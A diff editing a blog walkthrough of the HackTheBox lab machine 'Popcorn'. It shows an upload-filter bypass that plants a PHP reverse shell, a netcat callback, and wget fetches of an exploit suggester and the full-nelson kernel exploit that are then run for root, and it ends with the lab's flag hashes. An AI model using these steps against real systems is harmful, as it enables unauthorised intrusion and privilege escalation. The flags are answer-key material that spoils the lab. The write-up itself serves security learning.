@@ -53,11 +53,11 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 20.18 seconds
 ```
 
-It seems like there’s a website. Let’s check it out!
+Here is the default webpage.
 
 ![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/website.png?raw=true)
 
-It seems like there’s nothing much on the website.. or is it?
+Running `gobuster` on the webpage results in an interesting directory called `/torrent`.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro]
@@ -70,27 +70,21 @@ It seems like there’s nothing much on the website.. or is it?
 ...
 ```
 
-There’s an interesting directory `/torrent` OwO!
-
 ![torrent_homepage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/torrent_homepage.png?raw=true)
 
-I tried to brute force the login page with some default credentials but failed.
-
-So I tried signing up for an account instead!
+There is an option to sign up for an account.
 
 ![sign_up](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/sign_up.png?raw=true)
 
 # Exploit
 
-After logging in with the newly created account, I checked out their upload page.
+Upon logging into the newly created account, it was observed that there is an upload page.
 
 ![torrent_uploadpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/torrent_uploadpage.png?raw=true)
 
-It seems like we can upload a torrent file here, but can we uploading anything else? 
+It seems like we can upload a torrent file here, but can we uploading anything else? Uploading a PHP reverse shell returns an error “`This is not a valid torrent file`".
 
-Let’s use a PHP reverse shell from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell)! However, attempting to upload the reverse shell returns an error “`This is not a valid torrent file`"
-
-Let’s upload a proper torrent [file](https://webtorrent.io/free-torrents) instead
+Let’s upload a proper torrent [file](https://webtorrent.io/free-torrents) instead.
 
 ![upload_torrent](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/upload_torrent.png?raw=true)
 
@@ -100,9 +94,7 @@ One of the features allow us to change the screenshot. Perhaps we can do somethi
 
 ![edit_torrent](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/edit_torrent.png?raw=true)
 
-This time, trying to upload the reverse shell returns us a “`invalid file`” error.
-
-What if we intercepted the request on Burp Suite and then change `Content-Type: application/x-php` to `Content-Type: image/png`?
+This time, trying to upload a PHP reverse shell resulted in a “`invalid file`” error. What if we intercepted the request and changed the `Content-Type: application/x-php` to `Content-Type: image/png`?
 
 ```http
 HTTP/1.1 200 OK
@@ -120,24 +112,18 @@ Content-Type: text/html
 Upload: exploit.php<br />Type: image/png<br />Size: 5.3623046875 Kb<br />Upload Completed. <br />Please refresh to see the new screenshot.
 ```
 
-Great! It works. However, where is the file being uploaded to?
-
-I used the same `Gobuster` command again on `http://10.10.10.6/torrent/` and found that there is an `/upload` directory!
+Great! It works. However, where is the file being uploaded to? Running`Gobuster` on `http://10.10.10.6/torrent/` showed that there is an `/upload` directory.
 
 ![torrent_upload_dir](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Popcorn/torrent_upload_dir.png?raw=true)
 
-From here, I started a netcat listener and executed the `php` file by clicking on the file.
+Execute the reverse shell by clicking on the uploaded file.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro]
 └─# nc -nlvp 1234       
 listening on [any] 1234 ...
 connect to [10.10.14.9] from (UNKNOWN) [10.10.10.6] 34129
-Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
- 09:57:44 up 48 min,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: can't access tty; job control turned off
+...
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ uname -r
@@ -146,25 +132,15 @@ $ uname -r
 
 # Privilege Escalation
 
-It seems like it’s a Linux machine, so let’s use Linux Exploit Suggester to find out the possible vulnerabilities!
+Executed Linux Exploit Suggester to find out some possible vulnerabilities.
 
 ```bash
 - On local machine - 
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Popcorn]
-└─# wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh 
-
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Popcorn]
-└─# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
-- On netcat shell -
 $ wget http://10.10.14.9:8000/les.sh
 $ chmod +x les.sh
 $ ./les.sh
-
 ...
 Possible Exploits:
-
 cat: write error: Broken pipe
 [+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson
 
@@ -187,32 +163,16 @@ cat: write error: Broken pipe
 It seems like the machine is highly likely to be vulnerable to `full-nelson` (local privilege escalation) exploit!
 
 ```bash
-- On local machine - 
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Popcorn]
-└─# wget http://vulnfactory.org/exploits/full-nelson.c                                                              
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Popcorn]
-└─# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
-- On netcat shell - 
 $ wget http://10.10.14.9:8000/full-nelson.c
 $ gcc full-nelson.c -o full-nelson
 $ chmod +x full-nelson
 $ ./full-nelson
 id
 uid=0(root) gid=0(root)
-cd /home
-ls
-george
-cd george
-ls
-torrenthoster.zip
-user.txt
+cd /home/george
 cat user.txt
 c1b9db61d386e3f830c010480ab54077
 cd /root
-ls
-root.txt
 cat root.txt
 c5ba80b7f9f478d28cbbf7c59df47478
 ```
